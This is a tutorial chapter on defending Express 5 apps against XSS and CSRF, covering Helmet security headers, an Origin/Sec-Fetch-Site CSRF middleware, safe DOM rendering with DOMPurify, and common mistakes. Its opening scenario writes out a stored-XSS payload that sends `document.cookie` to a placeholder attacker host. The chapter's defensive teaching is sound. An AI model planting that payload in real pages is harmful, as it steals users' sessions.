---
title: XSS, CSRF, and security headers
tech: Node.js 26, Express 5, Helmet
version: Express 5.2, Helmet 8
date: 2026-11-07
covers: [5, 6, 7]
---
# XSS, CSRF, and security headers
[← Overview](00-overview.md)

## Why it matters
- A support dashboard renders customer names as HTML. One customer is named `<img src=x onerror=fetch('//evil/'+document.cookie)>`, and every support agent's session leaks.
- A bank-style "transfer" endpoint uses cookie auth and accepts form posts. A malicious page auto-submits a hidden form while the victim is logged in.
- No `frame-ancestors` policy: an attacker frames your "Delete account" page invisibly and tricks users into clicking it (clickjacking).

## Concepts

### Cross-site scripting (XSS)
Attacker-controlled data runs as script in your origin, with the user's session.

| Type | Where the payload lives | Example |
|:--|:--|:--|
| Stored | your database | comment or profile name rendered as HTML |
| Reflected | the request | `/search?q=<script>…` echoed in the page |
| DOM-based | client-side JS | `el.innerHTML = location.hash.slice(1)` |

Defenses, in order:
1. **Contextual output encoding.** React and most template engines escape text by default. Danger spots: `dangerouslySetInnerHTML`, `innerHTML`, `href`/`src` with `javascript:` URLs, unescaped server templates.
2. **Sanitize HTML you must render** (Markdown, rich text) with DOMPurify, on output.
3. **Content Security Policy** as a second line: blocks inline scripts and unknown origins even if encoding fails.
4. **`HttpOnly` cookies** so a successful XSS can't read the session token (it can still act as the user).

### CSRF
Another site makes the browser send a request to your API with the user's cookies. It only matters for **cookie-based** auth.

| Defense | How | Notes |
|:--|:--|:--|
| `SameSite=Lax` cookies | browser omits cookies on cross-site POSTs | default in modern browsers; not complete |
| Check `Origin` / `Sec-Fetch-Site` | reject state-changing requests from other sites | simple, effective for APIs |
| CSRF tokens | synchronizer or double-submit token in a header | needed for older browsers or same-site attackers |
| Require `Content-Type: application/json` | cross-site forms can't send JSON without a preflight | supporting layer only |

Safe methods (GET, HEAD) must never change state; CSRF defenses usually skip them.

### Security headers (Helmet 8 defaults)
| Header | Default value | Protects against |
|:--|:--|:--|
| `Content-Security-Policy` | `default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'self'; …` | XSS impact, clickjacking |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | HTTPS downgrade |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing |
| `X-Frame-Options` | `SAMEORIGIN` | clickjacking (legacy browsers) |
| `Referrer-Policy` | `no-referrer` | URL leakage to other sites |
| `Cross-Origin-Opener-Policy` | `same-origin` | cross-window attacks |
| `Cross-Origin-Resource-Policy` | `same-origin` | other sites embedding your resources |
| `Origin-Agent-Cluster` | `?1` | process isolation hint |
| `X-XSS-Protection` | `0` | disables a buggy legacy filter |
| `X-Powered-By` | removed | fingerprinting |

## Example
`src/security.ts` — Helmet for a JSON API, plus a CSRF check for cookie-authenticated routes.
```ts
import express, { type NextFunction, type Request, type Response } from 'express';
import helmet from 'helmet';

const app = express();

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'none'"],      // an API serves JSON, not pages
        frameAncestors: ["'none'"],  // never framed
      },
    },
  }),
);

const allowedOrigins = new Set(['https://app.example.com']);
const SAFE = new Set(['GET', 'HEAD', 'OPTIONS']);

function csrfGuard(req: Request, res: Response, next: NextFunction) {
  if (SAFE.has(req.method)) return next();
  const site = req.get('sec-fetch-site');           // sent by all modern browsers
  const origin = req.get('origin');
  if (site === 'same-origin' || site === 'same-site' || (origin && allowedOrigins.has(origin))) {
    return next();
  }
  if (!site && !origin) return next(); // non-browser clients (curl, server-to-server) don't carry ambient cookies
  res.status(403).json({ error: 'Cross-site request blocked' });
}

app.use(express.json({ limit: '100kb' }));
app.use('/api', csrfGuard);
app.listen(3000);
```
Rendering user content safely in the browser:
```ts
import DOMPurify from 'dompurify';

nameEl.textContent = user.name;                          // text, never HTML
bioEl.innerHTML = DOMPurify.sanitize(renderMarkdown(user.bio)); // only sanitized HTML

const url = new URL(user.website, location.origin);
if (url.protocol === 'https:' || url.protocol === 'http:') linkEl.href = url.href; // no javascript:
```
Check the headers: `curl -sI localhost:3000/api/health`, or securityheaders.com and Mozilla HTTP Observatory for public sites.

## Production patterns
- **Escape by default, sanitize on output, CSP as backup.** Never rely on input filtering for XSS.
- **Pages get a nonce-based CSP** with `'strict-dynamic'`; start in `Content-Security-Policy-Report-Only` and collect reports before enforcing ([02-frontend/11-security](../../../02-frontend/11-security/README.md) does this in Next.js).
- **`frame-ancestors 'none'`** unless you really need to be embedded.
- **Cookie auth = CSRF defense.** `SameSite=Lax` plus an `Origin`/`Sec-Fetch-Site` check covers modern browsers; add tokens for high-value actions.
- **Serve user uploads from a separate domain** (e.g. `usercontent.example.net`) so HTML files can't run in your origin.

## Mistakes
Wrong: HTML from user data.
```tsx
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
```
Right:
```tsx
<div>{comment.body}</div>
// or, for rich text: dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }}
```

Wrong: state change on GET.
```ts
app.get('/account/delete', deleteAccount); // an <img src> on any site triggers it
```
Right: `app.post('/account/delete', csrfGuard, deleteAccount)`.

Wrong: `unsafe-inline` to "make CSP work".
```text
script-src 'self' 'unsafe-inline'
```
Right: move inline scripts to files, or use nonces.

Wrong: escaping input when saving (`&lt;` stored in the DB). It double-encodes, corrupts data for other outputs (CSV, email), and still misses contexts like URLs.
Right: store raw data; encode for the context at output.

## Check yourself
1. Why does `HttpOnly` limit the damage of XSS but not stop it?
2. Your API uses `Authorization: Bearer` tokens from `localStorage`, not cookies. Is CSRF a concern? What risk grows instead?
3. What does `frame-ancestors 'none'` prevent?

<details>
<summary>Answers</summary>

1. The script can't read the cookie, so the session can't be stolen and reused elsewhere. But the script still runs in your origin and can send requests as the user while the page is open.
2. CSRF mostly goes away, because browsers don't attach the token automatically. But any XSS can read `localStorage` and steal the token, so XSS becomes more damaging.
3. Any site (including yours) framing the page, which blocks clickjacking. It replaces the older `X-Frame-Options`.
</details>

## Sources
- [OWASP — Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP — CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Helmet — documentation](https://helmetjs.github.io/)
- [MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN — Sec-Fetch-Site](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site)
- [DOMPurify](https://github.com/cure53/DOMPurify)
